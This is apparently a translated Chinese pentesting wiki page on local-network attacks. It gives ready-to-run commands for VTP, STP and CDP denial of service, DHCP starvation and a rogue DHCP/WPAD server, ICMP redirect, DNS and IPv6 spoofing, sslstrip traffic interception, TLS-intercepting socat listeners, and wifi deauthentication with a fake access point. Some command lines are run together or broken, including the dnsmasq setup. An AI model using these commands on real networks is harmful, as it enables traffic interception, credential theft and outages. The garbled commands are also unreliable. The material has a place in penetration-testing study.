<p>攻击是通过创建一个<strong>携带目标客户端 IP 地址但带有路由器 MAC 地址的包</strong>来执行的。这导致路由器错误地将数据包转发给目标客户端。这种方法类似于双标记攻击中使用的方法，其中利用可访问受害者的主机的能力来利用安全漏洞。</p>
<p><strong>攻击的关键步骤：</strong></p>
<ol>
<li><strong>构造数据包：</strong> 特别构造一个数据包，以包含目标客户端的 IP 地址，但带有路由器的 MAC 地址。</li>
<li><strong>利用路由器行为：</strong> 将构造的数据包发送到路由器，由于配置原因，路由器将数据包重定向到目标客户端，绕过私有 VLAN 设置提供的隔离。</li>
</ol>
<h3 id="vtp-attacks"><a class="header" href="#vtp-attacks">VTP Attacks</a></h3>
<p>VTP（VLAN Trunking Protocol）集中管理 VLAN。它利用修订号来维护 VLAN 数据库的完整性；任何修改都会增加此数字。交换机采用具有更高修订号的配置，更新自己的 VLAN 数据库。</p>
<h4 id="vtp-domain-roles"><a class="header" href="#vtp-domain-roles">VTP Domain Roles</a></h4>
<ul>
<li><strong>VTP Server:</strong> 管理 VLAN——创建、删除、修改。它向域成员广播 VTP 通告。</li>
<li><strong>VTP Client:</strong> 接收 VTP 通告以同步其 VLAN 数据库。此角色限制本地 VLAN 配置修改。</li>
<li><strong>VTP Transparent:</strong> 不参与 VTP 更新，但转发 VTP 通告。不受 VTP 攻击影响，保持修订号为零。</li>
</ul>
<h4 id="vtp-advertisement-types"><a class="header" href="#vtp-advertisement-types">VTP Advertisement Types</a></h4>
<ul>
<li><strong>Summary Advertisement:</strong> 每 300 秒由 VTP 服务器广播，携带基本域信息。</li>
<li><strong>Subset Advertisement:</strong> 在 VLAN 配置更改后发送。</li>
<li><strong>Advertisement Request:</strong> 由 VTP 客户端发出，请求 Summary Advertisement，通常是响应检测到更高的配置修订号。</li>
</ul>
<p>VTP 漏洞仅通过干道端口可被利用，因为 VTP 通告仅通过这些端口传播。在 DTP 攻击场景之后，可能会转向 VTP。像 Yersinia 这样的工具可以促进 VTP 攻击，旨在清除 VLAN 数据库，有效地破坏网络。</p>
<p>注意：本讨论涉及 VTP 版本 1（VTPv1）。</p>
<pre><code class="language-bash">%% yersinia -G # Launch Yersinia in graphical mode ```
</code></pre>
<p>在Yersinia的图形模式中，选择删除所有VTP VLAN选项以清除VLAN数据库。</p>
<h3 id="stp攻击"><a class="header" href="#stp攻击">STP攻击</a></h3>
<p><strong>如果您无法在接口上捕获BPDU帧，那么您在STP攻击中成功的可能性不大。</strong></p>
<h4 id="stp-bpdu-dos"><a class="header" href="#stp-bpdu-dos"><strong>STP BPDU DoS</strong></a></h4>
<p>发送大量的BPDUs TCP（拓扑变化通知）或Conf（在创建拓扑时发送的BPDUs），交换机会过载并停止正常工作。</p>
<pre><code class="language-bash">yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
</code></pre>
<h4 id="stp-tcp攻击"><a class="header" href="#stp-tcp攻击"><strong>STP TCP攻击</strong></a></h4>
<p>当发送TCP时，交换机的CAM表将在15秒内被删除。然后，如果您持续发送这种数据包，CAM表将不断重启（或每15秒重启一次），当它重启时，交换机的行为就像一个集线器。</p>
<pre><code class="language-bash">yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
</code></pre>
<h4 id="stp-root-attack"><a class="header" href="#stp-root-attack"><strong>STP Root Attack</strong></a></h4>
<p>攻击者模拟交换机的行为，以成为网络的 STP 根。然后，更多的数据将通过他传输。当你连接到两个不同的交换机时，这一点很有趣。<br />
这是通过发送 BPDUs CONF 数据包来完成的，声称 <strong>优先级</strong> 值低于实际根交换机的实际优先级。</p>
<pre><code class="language-bash">yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
</code></pre>
<p><strong>如果攻击者连接到两个交换机，他可以成为新树的根，所有在这些交换机之间的流量将通过他</strong>（将执行MITM攻击）。</p>
<pre><code class="language-bash">yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --&gt; "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
</code></pre>
<h3 id="cdp-攻击"><a class="header" href="#cdp-攻击">CDP 攻击</a></h3>
<p>CISCO 发现协议 (CDP) 对于 CISCO 设备之间的通信至关重要，使它们能够 <strong>相互识别并共享配置细节</strong>。</p>
<h4 id="被动数据收集"><a class="header" href="#被动数据收集">被动数据收集 <a href="#id-0e0f" id="id-0e0f"></a></a></h4>
<p>CDP 被配置为通过所有端口广播信息，这可能导致安全风险。攻击者在连接到交换机端口后，可以部署网络嗅探器，如 <strong>Wireshark</strong>、<strong>tcpdump</strong> 或 <strong>Yersinia</strong>。此操作可以揭示有关网络设备的敏感数据，包括其型号和运行的 Cisco IOS 版本。攻击者可能会针对识别出的 Cisco IOS 版本中的特定漏洞。</p>
<h4 id="引发-cdp-表泛洪"><a class="header" href="#引发-cdp-表泛洪">引发 CDP 表泛洪 <a href="#id-0d6a" id="id-0d6a"></a></a></h4>
<p>一种更激进的方法是通过假装是合法的 CISCO 设备来发起拒绝服务 (DoS) 攻击，从而压倒交换机的内存。以下是使用 Yersinia 这一网络工具发起此类攻击的命令序列：</p>
<pre><code class="language-bash">sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
</code></pre>
<p>在此攻击中，交换机的CPU和CDP邻居表负担沉重，导致通常所称的**“网络瘫痪”**，这是由于过度的资源消耗。</p>
<h4 id="cdp冒充攻击"><a class="header" href="#cdp冒充攻击">CDP冒充攻击</a></h4>
<pre><code class="language-bash">sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
</code></pre>
<p>您还可以使用 <a href="https://github.com/secdev/scapy/"><strong>scapy</strong></a>。确保使用 <code>scapy/contrib</code> 包进行安装。</p>
<h3 id="voip攻击和voip-hopper工具"><a class="header" href="#voip攻击和voip-hopper工具">VoIP攻击和VoIP Hopper工具</a></h3>
<p>VoIP电话与物联网设备的集成日益增加，提供了通过特殊电话号码解锁门或控制恒温器等功能。然而，这种集成可能会带来安全风险。</p>
<p>工具 <a href="http://voiphopper.sourceforge.net"><strong>voiphopper</strong></a> 旨在在各种环境中模拟VoIP电话（Cisco、Avaya、Nortel、Alcatel-Lucent）。它使用CDP、DHCP、LLDP-MED和802.1Q ARP等协议发现语音网络的VLAN ID。</p>
<p><strong>VoIP Hopper</strong> 为Cisco发现协议（CDP）提供三种模式：</p>
<ol>
<li><strong>嗅探模式</strong> (<code>-c 0</code>): 分析网络数据包以识别VLAN ID。</li>
<li><strong>欺骗模式</strong> (<code>-c 1</code>): 生成自定义数据包，模仿实际VoIP设备的数据包。</li>
<li><strong>使用预制数据包的欺骗模式</strong> (<code>-c 2</code>): 发送与特定Cisco IP电话型号相同的数据包。</li>
</ol>
<p>速度优先的模式是第三种。它需要指定：</p>
<ul>
<li>攻击者的网络接口（<code>-i</code> 参数）。</li>
<li>被模拟的VoIP设备的名称（<code>-E</code> 参数），遵循Cisco命名格式（例如，SEP后跟MAC地址）。</li>
</ul>
<p>在企业环境中，为了模仿现有的VoIP设备，可以：</p>
<ul>
<li>检查电话上的MAC标签。</li>
<li>浏览电话的显示设置以查看型号信息。</li>
<li>将VoIP设备连接到笔记本电脑，并使用Wireshark观察CDP请求。</li>
</ul>
<p>在第三种模式下执行工具的示例命令为：</p>
<pre><code class="language-bash">voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
</code></pre>
<h3 id="dhcp-攻击"><a class="header" href="#dhcp-攻击">DHCP 攻击</a></h3>
<h4 id="枚举"><a class="header" href="#枚举">枚举</a></h4>
<pre><code class="language-bash">nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
</code></pre>
<p><strong>DoS</strong></p>
<p><strong>两种类型的 DoS</strong> 可以针对 DHCP 服务器执行。第一种是 <strong>模拟足够多的虚假主机以使用所有可能的 IP 地址</strong>。<br />
此攻击仅在您能够看到 DHCP 服务器的响应并完成协议时有效 (<strong>Discover</strong> (Comp) --&gt; <strong>Offer</strong> (server) --&gt; <strong>Request</strong> (Comp) --&gt; <strong>ACK</strong> (server))。例如，这在 <strong>Wifi 网络中是不可行的</strong>。</p>
<p>执行 DHCP DoS 的另一种方法是发送 <strong>DHCP-RELEASE 数据包，源代码使用每个可能的 IP</strong>。然后，服务器会认为每个人都已经完成了对该 IP 的使用。</p>
<pre><code class="language-bash">yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
</code></pre>
<p>一个更自动化的方法是使用工具 <a href="https://github.com/kamorin/DHCPig">DHCPing</a></p>
<p>您可以使用上述的 DoS 攻击迫使客户端在环境中获取新的租约，并耗尽合法服务器，使其变得无响应。因此，当合法客户端尝试重新连接时，<strong>您可以提供下一个攻击中提到的恶意值</strong>。</p>
<h4 id="设置恶意值"><a class="header" href="#设置恶意值">设置恶意值</a></h4>
<p>可以使用位于 <code>/usr/share/responder/DHCP.py</code> 的 DHCP 脚本设置一个流氓 DHCP 服务器。这对于网络攻击非常有用，例如通过将流量重定向到恶意服务器来捕获 HTTP 流量和凭据。然而，设置流氓网关的效果较差，因为它仅允许捕获客户端的出站流量，无法获取来自真实网关的响应。相反，建议设置流氓 DNS 或 WPAD 服务器以进行更有效的攻击。</p>
<p>以下是配置流氓 DHCP 服务器的命令选项：</p>
<ul>
<li><strong>我们的 IP 地址（网关广告）</strong>：使用 <code>-i 10.0.0.100</code> 将您的机器 IP 广告为网关。</li>
<li><strong>本地 DNS 域名</strong>：可选地使用 <code>-d example.org</code> 设置本地 DNS 域名。</li>
<li><strong>原始路由器/网关 IP</strong>：使用 <code>-r 10.0.0.1</code> 指定合法路由器或网关的 IP 地址。</li>
<li><strong>主 DNS 服务器 IP</strong>：使用 <code>-p 10.0.0.100</code> 设置您控制的流氓 DNS 服务器的 IP 地址。</li>
<li><strong>次级 DNS 服务器 IP</strong>：可选地使用 <code>-s 10.0.0.1</code> 设置次级 DNS 服务器 IP。</li>
<li><strong>本地网络的子网掩码</strong>：使用 <code>-n 255.255.255.0</code> 定义本地网络的子网掩码。</li>
<li><strong>DHCP 流量的接口</strong>：使用 <code>-I eth1</code> 在特定网络接口上监听 DHCP 流量。</li>
<li><strong>WPAD 配置地址</strong>：使用 <code>-w “http://10.0.0.100/wpad.dat”</code> 设置 WPAD 配置的地址，以协助网络流量拦截。</li>
<li><strong>伪造默认网关 IP</strong>：包括 <code>-S</code> 以伪造默认网关 IP 地址。</li>
<li><strong>响应所有 DHCP 请求</strong>：包括 <code>-R</code> 使服务器响应所有 DHCP 请求，但要注意这会产生噪音并可能被检测到。</li>
</ul>
<p>通过正确使用这些选项，可以有效地建立一个流氓 DHCP 服务器以拦截网络流量。</p>
<pre><code class="language-python"># Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
</code></pre>
<h3 id="eap攻击"><a class="header" href="#eap攻击"><strong>EAP攻击</strong></a></h3>
<p>以下是可以针对802.1X实现使用的一些攻击策略：</p>
<ul>
<li>通过EAP进行主动的暴力破解密码</li>
<li>使用格式错误的EAP内容攻击RADIUS服务器 <em>**</em>(利用)</li>
<li>捕获EAP消息并进行离线密码破解（EAP-MD5和PEAP）</li>
<li>强制EAP-MD5身份验证以绕过TLS证书验证</li>
<li>在使用集线器或类似设备进行身份验证时注入恶意网络流量</li>
</ul>
<p>如果攻击者位于受害者和身份验证服务器之间，他可以尝试降级（如有必要）身份验证协议到EAP-MD5并捕获身份验证尝试。然后，他可以使用以下方法进行暴力破解：</p>
<pre><code>eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
</code></pre>
<h3 id="fhrp-glbp--hsrp-attacks"><a class="header" href="#fhrp-glbp--hsrp-attacks">FHRP (GLBP &amp; HSRP) Attacks <a href="#id-6196" id="id-6196"></a></a></h3>
<p><strong>FHRP</strong>（第一跳冗余协议）是一类旨在<strong>创建热冗余路由系统</strong>的网络协议。通过FHRP，物理路由器可以组合成一个单一的逻辑设备，从而提高容错能力并帮助分配负载。</p>
<p><strong>思科系统工程师开发了两种FHRP协议，GLBP和HSRP。</strong></p>
<p>{% content-ref url="glbp-and-hsrp-attacks.md" %}
<a href="glbp-and-hsrp-attacks.html">glbp-and-hsrp-attacks.md</a>
{% endcontent-ref %}</p>
<h3 id="rip"><a class="header" href="#rip">RIP</a></h3>
<p>已知存在三种版本的路由信息协议（RIP）：RIP、RIPv2和RIPng。RIP和RIPv2通过UDP的520端口向对等体发送数据报，而RIPng则通过IPv6组播向UDP的521端口广播数据报。RIPv2引入了MD5认证。另一方面，RIPng没有内置认证，而是依赖于IPv6中的可选IPsec AH和ESP头。</p>
<ul>
<li><strong>RIP和RIPv2：</strong> 通过UDP数据报在520端口进行通信。</li>
<li><strong>RIPng：</strong> 利用UDP的521端口通过IPv6组播广播数据报。</li>
</ul>
<p>请注意，RIPv2支持MD5认证，而RIPng不包括内置认证，依赖于IPv6中的IPsec AH和ESP头。</p>
<h3 id="eigrp-attacks"><a class="header" href="#eigrp-attacks">EIGRP Attacks</a></h3>
<p><strong>EIGRP（增强型内部网关路由协议）<strong>是一种动态路由协议。<strong>它是一种距离矢量协议。</strong> 如果没有</strong>认证</strong>和被动接口的配置，<strong>入侵者</strong>可以干扰EIGRP路由并导致<strong>路由表中毒</strong>。此外，EIGRP网络（换句话说，自治系统）<strong>是扁平的，没有划分为任何区域</strong>。如果<strong>攻击者注入一条路由</strong>，这条路由很可能会<strong>传播</strong>到整个自治EIGRP系统。</p>
<p>攻击EIGRP系统需要<strong>与合法的EIGRP路由器建立邻居关系</strong>，这打开了许多可能性，从基本侦察到各种注入。</p>
<p><a href="https://frrouting.org/"><strong>FRRouting</strong></a>允许您实现<strong>支持BGP、OSPF、EIGRP、RIP和其他协议的虚拟路由器。</strong> 您只需在攻击者的系统上部署它，实际上可以假装成为路由域中的合法路由器。</p>
<p>{% content-ref url="eigrp-attacks.md" %}
<a href="eigrp-attacks.html">eigrp-attacks.md</a>
{% endcontent-ref %}</p>
<p><a href="https://code.google.com/p/coly/"><strong>Coly</strong></a>具有拦截EIGRP（增强型内部网关路由协议）广播的能力。它还允许注入数据包，可用于更改路由配置。</p>
<h3 id="ospf"><a class="header" href="#ospf">OSPF</a></h3>
<p>在开放最短路径优先（OSPF）协议中，<strong>通常使用MD5认证来确保路由器之间的安全通信</strong>。然而，这一安全措施可能会被像Loki和John the Ripper这样的工具破坏。这些工具能够捕获和破解MD5哈希，暴露认证密钥。一旦获得该密钥，就可以用来引入新的路由信息。要配置路由参数并建立被破坏的密钥，分别使用_注入_和_连接_选项卡。</p>
<ul>
<li><strong>捕获和破解MD5哈希：</strong> 使用Loki和John the Ripper等工具。</li>
<li><strong>配置路由参数：</strong> 通过_注入_选项卡进行。</li>
<li><strong>设置被破坏的密钥：</strong> 密钥在_连接_选项卡下配置。</li>
</ul>
<h3 id="other-generic-tools--sources"><a class="header" href="#other-generic-tools--sources">Other Generic Tools &amp; Sources</a></h3>
<ul>
<li><a href="https://github.com/c4s73r/Above"><strong>Above</strong></a>：扫描网络流量并查找漏洞的工具</li>
<li>您可以在<a href="https://github.com/Sab0tag3d/MITM-cheatsheet"><strong>这里</strong></a>找到一些<strong>关于网络攻击的更多信息</strong>。</li>
</ul>
<h2 id="spoofing"><a class="header" href="#spoofing"><strong>Spoofing</strong></a></h2>
<p>攻击者通过发送虚假的DHCP响应来配置网络中新成员的所有网络参数（GW、IP、DNS）。</p>
<pre><code class="language-bash">Ettercap
yersinia dhcp -attack 2 #More parameters are needed
</code></pre>
<h3 id="arp-spoofing"><a class="header" href="#arp-spoofing">ARP Spoofing</a></h3>
<p>查看<a href="./#arp-spoofing">上一节</a>。</p>
<h3 id="icmpredirect"><a class="header" href="#icmpredirect">ICMPRedirect</a></h3>
<p>ICMP重定向是发送一个ICMP数据包类型1代码5，表示攻击者是到达某个IP的最佳方式。然后，当受害者想要联系该IP时，它将通过攻击者发送数据包。</p>
<pre><code class="language-bash">Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
</code></pre>
<h3 id="dns-spoofing"><a class="header" href="#dns-spoofing">DNS Spoofing</a></h3>
<p>攻击者将解析受害者请求的某些（或所有）域名。</p>
<pre><code class="language-bash">set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
</code></pre>
<p><strong>使用 dnsmasq 配置自己的 DNS</strong></p>
<pre><code class="language-bash">apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" &gt; dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" &gt; dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
</code></pre>
<h3 id="本地网关"><a class="header" href="#本地网关">本地网关</a></h3>
<p>系统和网络通常存在多个路由。在本地网络中建立 MAC 地址列表后，使用 <em>gateway-finder.py</em> 来识别支持 IPv4 转发的主机。</p>
<pre><code>root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
</code></pre>
<h3 id="spoofing-llmnr-nbt-ns-and-mdns"><a class="header" href="#spoofing-llmnr-nbt-ns-and-mdns"><a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">Spoofing LLMNR, NBT-NS, and mDNS</a></a></h3>
<p>在DNS查找失败时，Microsoft系统依赖于<strong>链路本地多播名称解析（LLMNR）<strong>和</strong>NetBIOS名称服务（NBT-NS）<strong>进行本地主机解析。同样，<strong>Apple Bonjour</strong>和</strong>Linux零配置</strong>实现利用**多播DNS（mDNS）**在网络中发现系统。由于这些协议的未经身份验证的特性及其通过UDP广播消息的操作，攻击者可以利用它们将用户重定向到恶意服务。</p>
<p>您可以使用Responder伪装主机搜索的服务，发送虚假响应。<br />
在这里阅读更多关于<a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">如何使用Responder伪装服务的信息</a>。</p>
<h3 id="spoofing-wpad"><a class="header" href="#spoofing-wpad"><a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">Spoofing WPAD</a></a></h3>
<p>浏览器通常使用<strong>Web代理自动发现（WPAD）协议自动获取代理设置</strong>。这涉及从服务器获取配置详细信息，具体通过一个URL，例如"http://wpad.example.org/wpad.dat"。客户端可以通过各种机制发现此服务器：</p>
<ul>
<li>通过<strong>DHCP</strong>，其中发现通过使用特殊代码252条目来促进。</li>
<li>通过<strong>DNS</strong>，这涉及在本地域中搜索标记为_wpad_的主机名。</li>
<li>通过<strong>Microsoft LLMNR和NBT-NS</strong>，这些是DNS查找不成功时使用的后备机制。</li>
</ul>
<p>工具Responder利用此协议，充当<strong>恶意WPAD服务器</strong>。它使用DHCP、DNS、LLMNR和NBT-NS误导客户端连接到它。要深入了解如何使用Responder伪装服务，请<a href="spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html">查看此处</a>。</p>
<h3 id="spoofing-ssdp-and-upnp-devices"><a class="header" href="#spoofing-ssdp-and-upnp-devices"><a href="spoofing-ssdp-and-upnp-devices.html">Spoofing SSDP and UPnP devices</a></a></h3>
<p>您可以在网络中提供不同的服务，以尝试<strong>欺骗用户</strong>输入一些<strong>明文凭据</strong>。<strong>有关此攻击的更多信息，请参见</strong><a href="spoofing-ssdp-and-upnp-devices.html"><strong>Spoofing SSDP and UPnP Devices</strong></a><strong>。</strong></p>
<h3 id="ipv6-neighbor-spoofing"><a class="header" href="#ipv6-neighbor-spoofing">IPv6 Neighbor Spoofing</a></h3>
<p>此攻击与ARP欺骗非常相似，但在IPv6环境中。您可以让受害者认为GW的IPv6具有攻击者的MAC。</p>
<pre><code class="language-bash">sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 &lt;Router_IPv6&gt; #This option will send the Neighbor Advertisement packet every 2 seconds
</code></pre>
<h3 id="ipv6路由器广告欺骗洪水攻击"><a class="header" href="#ipv6路由器广告欺骗洪水攻击">IPv6路由器广告欺骗/洪水攻击</a></h3>
<p>一些操作系统默认通过网络中发送的RA数据包配置网关。要将攻击者声明为IPv6路由器，可以使用：</p>
<pre><code class="language-bash">sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via &lt;ROUTER_IPv6&gt; dev wlan0
fake_router6 wlan0 fe80::01/16
</code></pre>
<h3 id="ipv6-dhcp欺骗"><a class="header" href="#ipv6-dhcp欺骗">IPv6 DHCP欺骗</a></h3>
<p>默认情况下，一些操作系统尝试通过网络中的DHCPv6数据包配置DNS。然后，攻击者可以发送一个DHCPv6数据包，将自己配置为DNS。DHCP还为受害者提供了一个IPv6地址。</p>
<pre><code class="language-bash">dhcp6.spoof on
dhcp6.spoof.domains &lt;list of domains&gt;

mitm6
</code></pre>
<h3 id="http-假页面和js代码注入"><a class="header" href="#http-假页面和js代码注入">HTTP (假页面和JS代码注入)</a></h3>
<h2 id="互联网攻击"><a class="header" href="#互联网攻击">互联网攻击</a></h2>
<h3 id="sslstrip"><a class="header" href="#sslstrip">sslStrip</a></h3>
<p>基本上，这个攻击的作用是，在<strong>用户</strong>尝试<strong>访问</strong>一个<strong>HTTP</strong>页面并<strong>重定向</strong>到<strong>HTTPS</strong>版本的情况下，<strong>sslStrip</strong>将<strong>保持</strong>与<strong>客户端的HTTP连接</strong>和与<strong>服务器的HTTPS连接</strong>，这样它就能够以<strong>明文</strong>方式<strong>嗅探</strong>连接。</p>
<pre><code class="language-bash">apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
</code></pre>
<p>更多信息 <a href="https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf">这里</a>。</p>
<h3 id="sslstrip-和-dns2proxy-绕过-hsts"><a class="header" href="#sslstrip-和-dns2proxy-绕过-hsts">sslStrip+ 和 dns2proxy 绕过 HSTS</a></h3>
<p><strong>sslStrip+ 和 dns2proxy</strong> 与 <strong>sslStrip</strong> 的<strong>区别</strong>在于它们会<strong>重定向</strong>例如 <em><strong>www.facebook.com</strong></em> <strong>到</strong> <em><strong>wwww.facebook.com</strong></em>（注意<strong>多出的</strong>“<strong>w</strong>”），并将<strong>该域名的地址设置为攻击者 IP</strong>。这样，<strong>客户端</strong>将<strong>连接</strong>到 <em><strong>wwww.facebook.com</strong></em> <strong>（攻击者）</strong>，但在后台<strong>sslstrip+<strong>将</strong>通过 https 维护</strong>与 <strong>www.facebook.com</strong> 的<strong>真实连接</strong>。</p>
<p>此技术的<strong>目标</strong>是<strong>避免 HSTS</strong>，因为 <em><strong>wwww</strong>.facebook.com</em> <strong>不会</strong>被保存在<strong>浏览器的缓存</strong>中，因此浏览器会被欺骗以在 HTTP 中执行<strong>facebook 认证</strong>。<br />
请注意，为了执行此攻击，受害者必须最初尝试访问 <a href="http://www.faceook.com">http://www.faceook.com</a>，而不是 https。这可以通过修改 http 页面中的链接来实现。</p>
<p>更多信息 <a href="https://www.bettercap.org/legacy/#hsts-bypass">这里</a>，<a href="https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014">这里</a> 和 <a href="https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly">这里</a>。</p>
<p><strong>sslStrip 或 sslStrip+ 不再有效。这是因为浏览器中预先保存了 HSTS 规则，因此即使用户第一次访问“重要”域名，他也会通过 HTTPS 访问。此外，请注意，预先保存的规则和其他生成的规则可以使用标志</strong> <a href="https://hstspreload.appspot.com"><strong><code>includeSubdomains</code></strong></a> **，因此之前的 <em><strong>wwww.facebook.com</strong></em> <strong>示例将不再有效，因为</strong> <em><strong>facebook.com</strong></em> <strong>使用 HSTS 和 <code>includeSubdomains</code>。</strong></p>
<p>TODO: easy-creds, evilgrade, metasploit, factory</p>
<h2 id="tcp-监听端口"><a class="header" href="#tcp-监听端口">TCP 监听端口</a></h2>
<pre><code class="language-bash">sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
</code></pre>
<h2 id="tcp--ssl-在端口监听"><a class="header" href="#tcp--ssl-在端口监听">TCP + SSL 在端口监听</a></h2>
<h4 id="生成密钥和自签名证书"><a class="header" href="#生成密钥和自签名证书">生成密钥和自签名证书</a></h4>
<pre><code>FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt &gt;$FILENAME.pem
</code></pre>
<h4 id="使用证书进行监听"><a class="header" href="#使用证书进行监听">使用证书进行监听</a></h4>
<pre><code>sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
</code></pre>
<h4 id="使用证书监听并重定向到主机"><a class="header" href="#使用证书监听并重定向到主机">使用证书监听并重定向到主机</a></h4>
<pre><code>sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
</code></pre>
<p>有时，如果客户端检查CA是否有效，您可以<strong>提供由CA签署的其他主机名的证书</strong>。<br />
另一个有趣的测试是<strong>提供请求的主机名的自签名证书</strong>。</p>
<p>其他测试内容是尝试用一个有效的证书签署该证书，但该证书并不是有效的CA。或者使用有效的公钥，强制使用一种算法，如Diffie-Hellman（不需要用真实私钥解密的算法），当客户端请求真实私钥的探测（如哈希）时，发送一个假探测，并期望客户端不检查这个。</p>
<h2 id="bettercap-2"><a class="header" href="#bettercap-2">Bettercap</a></h2>
<pre><code class="language-bash"># Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
</code></pre>
<h3 id="active-discovery-notes"><a class="header" href="#active-discovery-notes">Active Discovery Notes</a></h3>
<p>请注意，当UDP数据包发送到没有请求端口的设备时，会发送一个ICMP（端口不可达）消息。</p>
<h3 id="arp-discover"><a class="header" href="#arp-discover"><strong>ARP discover</strong></a></h3>
<p>ARP数据包用于发现网络中正在使用的IP。PC必须为每个可能的IP地址发送请求，只有正在使用的IP才会响应。</p>
<h3 id="mdns-multicast-dns"><a class="header" href="#mdns-multicast-dns"><strong>mDNS (multicast DNS)</strong></a></h3>
<p>Bettercap每隔X毫秒发送一个MDNS请求，询问**_services_.dns-sd._udp.local**，看到这个数据包的机器通常会回答这个请求。然后，它只搜索回答“services”的机器。</p>
<p><strong>Tools</strong></p>
<ul>
<li>Avahi-browser (--all)</li>
<li>Bettercap (net.probe.mdns)</li>
<li>Responder</li>
</ul>
<h3 id="nbns-netbios-name-server"><a class="header" href="#nbns-netbios-name-server"><strong>NBNS (NetBios Name Server)</strong></a></h3>
<p>Bettercap广播数据包到端口137/UDP，询问名称“CKAAAAAAAAAAAAAAAAAAAAAAAAAAA”。</p>
<h3 id="ssdp-simple-service-discovery-protocol"><a class="header" href="#ssdp-simple-service-discovery-protocol"><strong>SSDP (Simple Service Discovery Protocol)</strong></a></h3>
